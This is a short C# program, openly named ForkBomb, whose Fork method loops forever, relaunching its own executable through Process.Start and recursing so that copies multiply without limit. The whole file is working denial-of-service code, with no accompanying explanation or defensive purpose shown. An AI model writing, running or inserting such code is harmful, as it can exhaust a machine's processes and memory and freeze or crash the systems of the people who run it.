using System;
using System.Diagnostics;

class ForkBomb
{
    static void Main()
    {
        Console.WriteLine("Initiating fork bomb...");
        Fork();
    }

    static void Fork()
    {
        while (true)
        {
            // Start a new process of the same application
            Process.Start(AppDomain.CurrentDomain.FriendlyName);
            Fork();
        }
    }
}
